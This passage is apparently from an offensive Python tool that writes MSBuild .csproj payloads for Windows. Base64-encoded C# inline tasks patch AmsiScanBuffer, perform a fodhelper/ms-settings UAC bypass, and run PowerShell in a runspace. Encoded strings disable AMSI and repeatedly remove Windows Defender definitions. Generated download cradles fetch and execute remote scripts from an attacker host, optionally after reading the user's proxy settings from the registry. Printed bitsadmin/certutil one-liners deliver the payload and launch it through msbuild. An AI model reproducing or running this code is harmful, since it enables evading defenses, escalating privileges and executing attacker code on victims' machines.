            upper = "PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogIDxUYXJnZXQgTmFtZT0iSGVsbG8iPgogICAgPENsYXNzRXhhbXBsZSAvPgogIDwvVGFyZ2V0PgogIDxVc2luZ1Rhc2sKICAgIFRhc2tOYW1lPSJDbGFzc0V4YW1wbGUiCiAgICBUYXNrRmFjdG9yeT0iQ29kZVRhc2tGYWN0b3J5IgogICAgQXNzZW1ibHlGaWxlPSJDOlxXaW5kb3dzXE1pY3Jvc29mdC5OZXRcRnJhbWV3b3JrXHY0LjAuMzAzMTlcTWljcm9zb2Z0LkJ1aWxkLlRhc2tzLnY0LjAuZGxsIiA+CiAgICA8VGFzaz4KICAgICAgPENvZGUgVHlwZT0iQ2xhc3MiIExhbmd1YWdlPSJjcyI+CiAgICAgIDwhW0NEQVRBWwogICAgICAgIHVzaW5nIFN5c3RlbTsKICAgICAgICB1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwogICAgICAgIHVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CiAgICAgICAgdXNpbmcgU3lzdGVtLlRleHQ7CiAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLkZyYW1ld29yazsKICAgICAgICB1c2luZyBNaWNyb3NvZnQuQnVpbGQuVXRpbGl0aWVzOwogICAgICAgIHVzaW5nIE1pY3Jvc29mdC5XaW4zMjsKICAgICAgICBwdWJsaWMgY2xhc3MgQ2xhc3NFeGFtcGxlIDogIFRhc2ssIElUYXNrCiAgICAgICAgeyAgICAgICAgIAogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIEVudHJ5UG9pbnQgPSAiUnRsTW92ZU1lbW9yeSIsIFNldExhc3RFcnJvciA9IGZhbHNlKV0KICAgICAgICAgIHN0YXRpYyBleHRlcm4gdm9pZCBNb3ZlTWVtb3J5KEludFB0ciBkZXN0LCBJbnRQdHIgc3JjLCBpbnQgc2l6ZSk7CiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICAgIHN0YXRpYyBleHRlcm4gdm9pZCBTbGVlcCh1aW50IGR3TWlsbGlzZWNvbmRzKTsKCiAgICAgICAgICBwdWJsaWMgb3ZlcnJpZGUgYm9vbCBFeGVjdXRlKCkKICAgICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKCiAgICAgICAgICAgIC8vd3JlY2sgbWltaQogICAgICAgICAgICBzdHJpbmcgbmFtZTEgPSAiYSIgKyAibXNpIiArICIuZGxsIjsKICAgICAgICAgICAgc3RyaW5nIG5hbWUyID0gIkEiICsgIm1zaSIgKyAiU2NhbkIiICsgInVmZmVyIjsKICAgICAgICAgICAgSW50UHRyIFRhcmdldERMTCA9IExvYWRMaWJyYXJ5KG5hbWUxKTsKICAgICAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICAgICAgVUludDMyIG9sZFByb3RlY3QgPSAwOwogICAgICAgICAgICBCeXRlW10gYnVmaSA9IHsgMHg0OCwgMHgzMSwgMHhDMCB9OwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgICAgIE1hcnNoYWwuQ29weShidWZpLCAwLCBNaW1pUHRyLCBidWZpLkxlbmd0aCk7CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4MjAsIG91dCBvbGRQcm90ZWN0KTs="
            lower = "ICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhkYXRhKTsKCiAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG5ld2tleSA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJTb2Z0d2FyZVxDbGFzc2VzXCIsIHRydWUpOwogICAgICAgICAgICBuZXdrZXkuQ3JlYXRlU3ViS2V5KEAibXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIik7CgogICAgICAgICAgICBSZWdpc3RyeUtleSBmb2QgPSBSZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KEAiU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQiLCB0cnVlKTsKICAgICAgICAgICAgZm9kLlNldFZhbHVlKCJEZWxlZ2F0ZUV4ZWN1dGUiLCAiIik7CiAgICAgICAgICAgIGZvZC5TZXRWYWx1ZSgiIiwgQGNvbW1hbmQpOwogICAgICAgICAgICBmb2QuQ2xvc2UoKTsKCiAgICAgICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7CiAgICAgICAgICAgIHAuU3RhcnRJbmZvLldpbmRvd1N0eWxlID0gUHJvY2Vzc1dpbmRvd1N0eWxlLkhpZGRlbjsKICAgICAgICAgICAgcC5TdGFydEluZm8uRmlsZU5hbWUgPSAiQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxmb2RoZWxwZXIuZXhlIjsKICAgICAgICAgICAgcC5TdGFydCgpOwoKICAgICAgICAgICAgVGhyZWFkLlNsZWVwKDEwMDAwKTsKCiAgICAgICAgICAgIG5ld2tleS5EZWxldGVTdWJLZXlUcmVlKCJtcy1zZXR0aW5ncyIpOwogICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICB9CiAgICAgICAgfSAgICAgCiAgICAgIF1dPgogICAgICA8L0NvZGU+CiAgICA8L1Rhc2s+CiAgPC9Vc2luZ1Rhc2s+CjwvUHJvamVjdD4="

            runnerfilename = "run.txt"

            cradle = "$wc = (new-object system.net.webclient);"
            if proxy_kill == "1":
                cradle += "$wc.proxy = $null;"
            if custom_agent == "1":
                cradle += "$wc.headers.add('User-Agent','%s');" % agent_string
            if proxy_steal == "1":
                cradle += "New-PSDrive -NAME HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = gci \'HKU:\\\';ForEach ($key in $keys) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr = (Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;"
                cradle += "[system.net.webrequest]::DefaultWebProxy = new-object system.net.webproxy(\"http://$proxyAddr\");" #note: assuming proxy over http, not https
            cradle += "iex($wc.downloadstring('%s'))"
            #print('[DEBUG] cradle:\n%s' % cradle)

            #//rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd" "/c p^o^w^e^rs^h^e^ll.exe iex((new-object net.webclient).downloadstring([System.Text.Encoding]::ASCII.GetString([char[]]@(104 , 116 ,116 ,112 ,58,47 , 47, 49 ,57, 50, 46,49, 54 , 56,46 ,49 ,51,53 ,46, 55 ,47,114,117, 110, 46, 116 , 120 ,116))))"
            target = "http://%s/%s" % (lhost,runnerfilename)
            target = cradle % target
            #print ('[DEBUG] target:\n%s' % target)
            chars = chararray(target)
            chars = ", ".join(chars)

            base = "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd\" \"/c p^o^w^e^rs^h^e^ll.exe iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))\""
            base = base % chars
            base_b64 = base64.b64encode(base.encode()).decode()
            #print (base)

            data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

            with open(csprojfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + data + "\n")
                f.write(lower)
            f.close()
            '''
            pass

    if ptype == "run":
        amsi = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQ=="
        defkill = "c3RhcnQtcHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtYXJndW1lbnRsaXN0ICJ3aGlsZSgxKXsmICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbDtzdGFydC1zbGVlcCAtc2Vjb25kcyAzMDB9IiAtd2luZG93c3R5bGUgaGlkZGVuCgomICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbA=="

        upper = "PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogIDwhLS0gVGhpcyBpbmxpbmUgdGFzayBleGVjdXRlcyBjIyBjb2RlLiAtLT4KICA8IS0tIEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOVxtc2J1aWxkLmV4ZSBwb3dhU2hlbGwuY3Nwcm9qIC0tPgogIDxUYXJnZXQgTmFtZT0iSGVsbG8iPgogICA8Q2xhc3NFeGFtcGxlIC8+CiAgPC9UYXJnZXQ+CiAgICA8VXNpbmdUYXNrCiAgICBUYXNrTmFtZT0iQ2xhc3NFeGFtcGxlIgogICAgVGFza0ZhY3Rvcnk9IkNvZGVUYXNrRmFjdG9yeSIKICAgIEFzc2VtYmx5RmlsZT0iQzpcV2luZG93c1xNaWNyb3NvZnQuTmV0XEZyYW1ld29ya1x2NC4wLjMwMzE5XE1pY3Jvc29mdC5CdWlsZC5UYXNrcy52NC4wLmRsbCIgPgogICAgPFRhc2s+CiAgICAgPFJlZmVyZW5jZSBJbmNsdWRlPSJDOlxXaW5kb3dzXGFzc2VtYmx5XEdBQ19NU0lMXFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb25cMS4wLjAuMF9fMzFiZjM4NTZhZDM2NGUzNVxTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLmRsbCIgLz4KICAgICA8IS0tIFlvdXIgUG93ZXJTaGVsbCBQYXRoIE1heSB2YXJ5IC0tPgogICAgICA8Q29kZSBUeXBlPSJDbGFzcyIgTGFuZ3VhZ2U9ImNzIj4KICAgICAgICA8IVtDREFUQVsKICAgICAgICAgICAgdXNpbmcgU3lzdGVtOwogICAgICAgICAgICB1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsKICAgICAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLkZyYW1ld29yazsKICAgICAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLlV0aWxpdGllczsKICAgICAgICAgICAgCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbDsKICAgICAgICAgICAgdXNpbmcgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbjsKICAgICAgICAgICAgdXNpbmcgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXM7CiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5UZXh0OwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIHB1YmxpYyBjbGFzcyBDbGFzc0V4YW1wbGUgOiAgVGFzaywgSVRhc2sKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcHVibGljIG92ZXJyaWRlIGJvb2wgRXhlY3V0ZSgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgcnVubmVyLlJ1bk1haFN0dWZmKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHB1YmxpYyBjbGFzcyBydW5uZXIKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUnVuTWFoU3R1ZmYoKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIEluaXRpYWxTZXNzaW9uU3RhdGUgaXNzID0gSW5pdGlhbFNlc3Npb25TdGF0ZS5DcmVhdGVEZWZhdWx0KCk7CiAgICAgICAgICAgICAgICAgICAgaXNzLkxhbmd1YWdlTW9kZSA9IFBTTGFuZ3VhZ2VNb2RlLkZ1bGxMYW5ndWFnZTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZShTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlNlY3VyaXR5LlN5c3RlbVBvbGljeS5HZXRTeXN0ZW1Mb2NrZG93blBvbGljeSgpKTs="
        lower = "ICAgICAgICAgICAgICAgICAgICBzdHJpbmcgY29tbWFuZCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKGRhdGEpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIFJ1bnNwYWNlIHJzID0gUnVuc3BhY2VGYWN0b3J5LkNyZWF0ZVJ1bnNwYWNlKGlzcyk7CiAgICAgICAgICAgICAgICAgICAgcnMuT3BlbigpOwogICAgICAgICAgICAgICAgICAgIFBvd2VyU2hlbGwgcHMgPSBQb3dlclNoZWxsLkNyZWF0ZSgpOwogICAgICAgICAgICAgICAgICAgIHBzLlJ1bnNwYWNlID0gcnM7CiAgICAgICAgICAgICAgICAgICAgcHMuQWRkU2NyaXB0KGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgIHBzLkludm9rZSgpOwogICAgICAgICAgICAgICAgICAgIHJzLkNsb3NlKCk7CgogICAgICAgICAgICAgICAgICAgIFN0cmluZyBzb21ldGhpbmcgPSAic29tZXRoaW5nIjsKCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNvbWV0aGluZzsgICAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICBdXT4KICAgICAgPC9Db2RlPgogICAgPC9UYXNrPgogIDwvVXNpbmdUYXNrPgo8L1Byb2plY3Q+"

        if pscmd != "0": #bad news - msbuild won't work with run.txt due to attempts to read protected memory at run.txt lines 110-124
            if pscmd[-4:] == ".ps1" or pscmd[-4:] == ".txt":
                if pscmd == "run.txt" or pscmd == "/var/www/html/run.txt":
                    runner(lhost,lport,bitness)
                if remote == "1":
                    print('[!] not direct! make sure %s is hosted at /var/www/html!' % pscmd)
                    if "/var/www/html/" in pscmd:
                        pscmd = pscmd.split("/var/www/html/")[1]
                        #print('[DEBUG] pscmd: %s' % pscmd)
                    else:
                        copy(pscmd,"/var/www/html/",pscmd)
                    fcradle,cradle = cradleps1(lhost,pscmd)
                    target = "http://%s/%s" % (lhost,pscmd)
                    target = cradle % target
                    target = base64.b64decode(amsi).decode() + ";" + target
                if remote == "0":
                    target,target_b64 = makeoneliner(pscmd)
                    #print('[DEBUG] target_b64: %s' % target)
                pass
            else:
                target = base64.b64decode(amsi).decode() + ";" + base64.b64decode(defkill).decode() + ";" + pscmd

        chars = chararray(target)
        chars = ", ".join(chars)

        base = "iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))"
        base = base % chars
        base_b64 = base64.b64encode(base.encode()).decode()
        #print(base)

        data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

        with open(csprojfilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            lower = base64.b64decode(lower).decode()
            f.write(upper + "\n")
            f.write("                    " + data + "\n")
            f.write(lower)
            f.close()

    print('[+] msbuild csproj written: %s' % csprojfilename)
    copy(csprojfilename,csprojwebroot,csprojfilename)
    return csprojfilepath,csprojfilename

def makemsbuild(bitness,lhost,lport,ptype,binary,pscmd,remote):
    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randcsprojname = "%s.csproj" % rand_word()
    runfilepath,runfilename = writemsbuild(bitness,lhost,lport,ptype,binary,pscmd,remote)
    runwebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    utilpath = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe %s'
    certutilcombo = "bitsadmin /Transfer myJob http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy networkservice AUTODETECT && " + certutilcombo_sub

    certfilename = certutil_b64encode(runwebroot+runfilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    runfileroot = runwebroot + runfilename
    runfilepath_met = loadpath_met % randcsprojname #runfilename
    runfilepath_cmd = loadpath_cmd % randcsprojname #runfilename

    combo_one = certutilcombo % (lhost,certfilename,certfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    combo_two = utilpath % (runfilepath_cmd)
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,runwebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (runfileroot,runfilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s' % (runfilepath_cmd))
    print('[*] use:\n%s ' % (combo_two))
    print('[!] c-c-c-combo breaker (cmd only!) (sub):\n%s' % combo_break_sub)    

    return combo_break,combo_break_sub
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='ptype',help='run or dir') #runspace or direct
    parser.add_argument('--binname','-b',required=False,dest='binary',help='SharpUp, Hollow, or UACHelper')
    parser.add_argument('--cmd','-c',required=False,dest='pscmd',help='arbitrary powershell command, only use with runspace!')
    parser.add_argument('--remote','-r',required=False,dest='remote',help='0 or 1, remote ps delivery with runspace')

    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    binary = args.binary
    pscmd = args.pscmd
    remote = args.remote

    if pscmd == None:
        pscmd = "0"
    if binary == None:
        binary = "0"
    if remote == None:
        remote = "0"

    if pscmd == "0" and binary == "0":
        print("[!] provide either binary or pscmd! -b SharpUp, Hollow, or UACHelper or -c pscmd. terminating!")
        sys.exit()

    if ptype == "binary" and binary == "0":
        print("[!] binary must be provided if -t bin is chosen! -b SharpUp, Hollow, or UACHelper. terminating!")
        sys.exit() 

    if ptype != "run":
        if pscmd != "0":
            print ("[!] -c pscmd only compatible with -t run! terminating!")
            sys.exit()
        if remote != "0":
            print ("[!] -r 1 only compatible with -t run! terminating!")
            sys.exit()

    makemsbuild(bitness,lhost,lport,ptype,binary,pscmd,remote)